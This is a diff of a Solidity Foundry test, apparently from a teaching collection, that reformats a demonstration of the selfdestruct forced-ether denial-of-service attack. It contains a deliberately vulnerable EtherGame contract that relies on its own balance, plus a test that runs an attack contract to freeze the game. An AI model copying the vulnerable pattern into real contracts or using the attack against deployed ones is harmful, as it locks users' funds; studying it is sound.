@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.15;
+pragma solidity ^0.8.18;
 
 import "forge-std/Test.sol";
 
@@ -15,15 +15,14 @@ Attack forced the balance of EtherGame to equal 7 ether.
 Now no one can deposit and the winner cannot be set.
 */
 
-
 contract EtherGame {
-    uint constant public targetAmount = 7 ether;
+    uint public constant targetAmount = 7 ether;
     address public winner;
 
     function deposit() public payable {
         require(msg.value == 1 ether, "You can only send 1 Ether");
 
-        uint balance = address(this).balance;   // vulnerable
+        uint balance = address(this).balance; // vulnerable
         require(balance <= targetAmount, "Game is over");
 
         if (balance == targetAmount) {
@@ -39,7 +38,6 @@ contract EtherGame {
     }
 }
 
-
 contract ContractTest is Test {
     EtherGame EtherGameContract;
     Attack AttackerContract;
@@ -50,8 +48,8 @@ contract ContractTest is Test {
         EtherGameContract = new EtherGame();
         alice = vm.addr(1);
         eve = vm.addr(2);
-        vm.deal(address(alice), 1 ether);   
-        vm.deal(address(eve), 1 ether); 
+        vm.deal(address(alice), 1 ether);
+        vm.deal(address(eve), 1 ether);
     }
 
     function testFailSelfdestruct() public {
@@ -59,26 +57,30 @@ contract ContractTest is Test {
         console.log("Eve balance", eve.balance);
 
         console.log("Alice deposit 1 Ether...");
-        vm.prank(alice);    
+        vm.prank(alice);
         EtherGameContract.deposit{value: 1 ether}();
 
         console.log("Eve deposit 1 Ether...");
         vm.prank(eve);
         EtherGameContract.deposit{value: 1 ether}();
 
-        console.log("Balance of EtherGameContract", address(EtherGameContract).balance);
+        console.log(
+            "Balance of EtherGameContract",
+            address(EtherGameContract).balance
+        );
 
         console.log("Attack...");
         AttackerContract = new Attack(EtherGameContract);
         AttackerContract.dos{value: 5 ether}();
 
-        console.log("Balance of EtherGameContract", address(EtherGameContract).balance);
+        console.log(
+            "Balance of EtherGameContract",
+            address(EtherGameContract).balance
+        );
         console.log("Exploit completed, Game is over");
         EtherGameContract.deposit{value: 1 ether}(); // This call will fail due to contract destroyed.
     }
 }
-
-
 
 contract Attack {
     EtherGame etherGame;
